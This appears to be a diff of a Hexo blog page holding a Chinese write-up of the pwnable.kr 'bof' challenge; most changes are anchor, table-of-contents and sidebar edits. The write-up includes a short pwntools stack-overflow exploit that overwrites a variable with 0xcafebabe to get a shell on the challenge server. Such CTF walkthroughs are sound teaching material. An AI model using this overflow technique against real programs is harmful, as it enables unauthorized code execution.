@@ -418,21 +418,16 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h3 id="font-color-brown一-相关知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-相关知识font"></a> <font color="brown">一、相关知识</font></h3>
-<h4 id="font-color-navy1pwntools工具font"><a class="markdownIt-Anchor" href="#font-color-navy1pwntools工具font"></a> <font color="navy">1.pwntools工具</font></h4>
-<blockquote>
+        <h3 id="一、相关知识"><a href="#一、相关知识" class="headerlink" title="一、相关知识"></a><font color="brown">一、相关知识</font></h3><h4 id="1-pwntools工具"><a href="#1-pwntools工具" class="headerlink" title="1.pwntools工具"></a><font color="navy">1.pwntools工具</font></h4><blockquote>
 <p>最近将会认真的总结一下相关的知识点</p>
 </blockquote>
-<h4 id="font-color-navy2函数调用在栈中的表现形式font"><a class="markdownIt-Anchor" href="#font-color-navy2函数调用在栈中的表现形式font"></a> <font color="navy">2.函数调用在栈中的表现形式</font></h4>
-<blockquote>
-<p>可以参考<a href="%5Bhttps://muzibing.github.io/2019/09/24/2019.09.24%EF%BC%8883%EF%BC%89/%5D(https://muzibing.github.io/2019/09/24/2019.09.24%EF%BC%8883%EF%BC%89/)">这里</a></p>
+<h4 id="2-函数调用在栈中的表现形式"><a href="#2-函数调用在栈中的表现形式" class="headerlink" title="2.函数调用在栈中的表现形式"></a><font color="navy">2.函数调用在栈中的表现形式</font></h4><blockquote>
+<p>可以参考<a href="[https://muzibing.github.io/2019/09/24/2019.09.24%EF%BC%8883%EF%BC%89/](https://muzibing.github.io/2019/09/24/2019.09.24（83）/">这里</a>)</p>
 </blockquote>
-<h4 id="font-color-navy3栈保护机制相关知识点font"><a class="markdownIt-Anchor" href="#font-color-navy3栈保护机制相关知识点font"></a> <font color="navy">3.栈保护机制相关知识点</font></h4>
-<blockquote>
+<h4 id="3-栈保护机制相关知识点"><a href="#3-栈保护机制相关知识点" class="headerlink" title="3.栈保护机制相关知识点"></a><font color="navy">3.栈保护机制相关知识点</font></h4><blockquote>
 <p>将会和其他知识进行总结</p>
 </blockquote>
-<h3 id="font-color-brown二-题目分析font"><a class="markdownIt-Anchor" href="#font-color-brown二-题目分析font"></a> <font color="brown">二、题目分析</font></h3>
-<blockquote>
+<h3 id="二、题目分析"><a href="#二、题目分析" class="headerlink" title="二、题目分析"></a><font color="brown">二、题目分析</font></h3><blockquote>
 <p>① 首先检查<code>bof</code>文件的类型，发现它是一个32位的ELF文件</p>
 </blockquote>
 <p><img src="/images/111-1.jpg" alt></p>
@@ -460,8 +455,7 @@ height:50vh;
 <blockquote>
 <p>⑥ 那么我们就可以利用<code>pwntools</code>工具进行攻击</p>
 </blockquote>
-<h3 id="font-color-brown三-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题步骤font"></a> <font color="brown">三、解题步骤</font></h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>)</span><br><span class="line">r = remote(<span class="string">"pwnable.kr"</span>,<span class="number">9000</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">52</span> + str(p32(<span class="number">0xcafebabe</span>),encoding=<span class="string">"unicode_escape"</span>)	<span class="comment"># 52 = 0x2c + 8</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="三、解题步骤"><a href="#三、解题步骤" class="headerlink" title="三、解题步骤"></a><font color="brown">三、解题步骤</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>)</span><br><span class="line">r = remote(<span class="string">"pwnable.kr"</span>,<span class="number">9000</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">52</span> + str(p32(<span class="number">0xcafebabe</span>),encoding=<span class="string">"unicode_escape"</span>)	<span class="comment"># 52 = 0x2c + 8</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>运行上述代码，然后就<code>ls -l</code>，就可以查看相关文件的权限，其中<code>flag</code>文件有读的权限如下图：</p>
 </blockquote>
@@ -487,8 +481,8 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2020/04/30/2020.04.29（112）/" title="pwntools的简单总结（持续更新）">
-                    <div class="nextTitle">pwntools的简单总结（持续更新）</div>
+                <a href="/2020/04/30/2020.04.30（114）/" title="Dan-Boneh密码学课程之学习笔记（持续更新）">
+                    <div class="nextTitle">Dan-Boneh密码学课程之学习笔记（持续更新）</div>
                 </a>
             
         </li>
@@ -630,7 +624,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown一-相关知识font"><span class="toc-number">1.</span> <span class="toc-text"> 一、相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy1pwntools工具font"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.pwntools工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy2函数调用在栈中的表现形式font"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.函数调用在栈中的表现形式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy3栈保护机制相关知识点font"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.栈保护机制相关知识点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown二-题目分析font"><span class="toc-number">2.</span> <span class="toc-text"> 二、题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown三-解题步骤font"><span class="toc-number">3.</span> <span class="toc-text"> 三、解题步骤</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、相关知识"><span class="toc-number">1.</span> <span class="toc-text">一、相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-pwntools工具"><span class="toc-number">1.1.</span> <span class="toc-text">1.pwntools工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-函数调用在栈中的表现形式"><span class="toc-number">1.2.</span> <span class="toc-text">2.函数调用在栈中的表现形式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-栈保护机制相关知识点"><span class="toc-number">1.3.</span> <span class="toc-text">3.栈保护机制相关知识点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、题目分析"><span class="toc-number">2.</span> <span class="toc-text">二、题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、解题步骤"><span class="toc-number">3.</span> <span class="toc-text">三、解题步骤</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -643,234 +637,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -2976,12 +2742,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（113）/">Hexo博客完善（持续更新）</a>
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（114）/">Dan-Boneh密码学课程之学习笔记（持续更新）</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（114）/">Dan-Boneh密码学课程之学习笔记（持续更新）</a>
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（113）/">Hexo博客完善（持续更新）</a>
         </li>
     
     
@@ -2996,12 +2762,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.24（109）/">Pwnable.kr的奇幻之旅（二）[collision]</a>
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.23（108）/">Pwnable.kr的奇幻之旅（一）[fd]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.23（108）/">Pwnable.kr的奇幻之旅（一）[fd]</a>
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.24（109）/">Pwnable.kr的奇幻之旅（二）[collision]</a>
         </li>
     
     
@@ -3051,12 +2817,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（98）/">【转载】Data URI 知识点详解</a>
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（97）/">【转载】JavaScript 的隐式转换</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（97）/">【转载】JavaScript 的隐式转换</a>
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（98）/">【转载】Data URI 知识点详解</a>
         </li>
     
     
@@ -3559,21 +3325,23 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="汇编语言"><span class="iconfont-archer">&#xe606;</span>汇编语言</span>
     
-        <span class="sidebar-tag-name" data-tags="研究生复试"><span class="iconfont-archer">&#xe606;</span>研究生复试</span>
-    
         <span class="sidebar-tag-name" data-tags="《保密概论》"><span class="iconfont-archer">&#xe606;</span>《保密概论》</span>
+    
+        <span class="sidebar-tag-name" data-tags="研究生复试"><span class="iconfont-archer">&#xe606;</span>研究生复试</span>
     
         <span class="sidebar-tag-name" data-tags="kali"><span class="iconfont-archer">&#xe606;</span>kali</span>
     
         <span class="sidebar-tag-name" data-tags="二进制"><span class="iconfont-archer">&#xe606;</span>二进制</span>
     
-        <span class="sidebar-tag-name" data-tags="基础知识"><span class="iconfont-archer">&#xe606;</span>基础知识</span>
-    
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="基础知识"><span class="iconfont-archer">&#xe606;</span>基础知识</span>
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
         <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="本科论文"><span class="iconfont-archer">&#xe606;</span>本科论文</span>
     
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
@@ -3581,27 +3349,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Virtual machine"><span class="iconfont-archer">&#xe606;</span>Virtual machine</span>
     
-        <span class="sidebar-tag-name" data-tags="本科论文"><span class="iconfont-archer">&#xe606;</span>本科论文</span>
+        <span class="sidebar-tag-name" data-tags="密码算法"><span class="iconfont-archer">&#xe606;</span>密码算法</span>
     
         <span class="sidebar-tag-name" data-tags="《软件安全分析与应用》"><span class="iconfont-archer">&#xe606;</span>《软件安全分析与应用》</span>
     
-        <span class="sidebar-tag-name" data-tags="密码算法"><span class="iconfont-archer">&#xe606;</span>密码算法</span>
-    
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
-    
-        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
-    
-        <span class="sidebar-tag-name" data-tags="JavaScritpt"><span class="iconfont-archer">&#xe606;</span>JavaScritpt</span>
-    
-        <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
     
         <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
+        <span class="sidebar-tag-name" data-tags="JavaScritpt"><span class="iconfont-archer">&#xe606;</span>JavaScritpt</span>
+    
         <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="pwnable.kr"><span class="iconfont-archer">&#xe606;</span>pwnable.kr</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
         <span class="sidebar-tag-name" data-tags="区块链"><span class="iconfont-archer">&#xe606;</span>区块链</span>
     
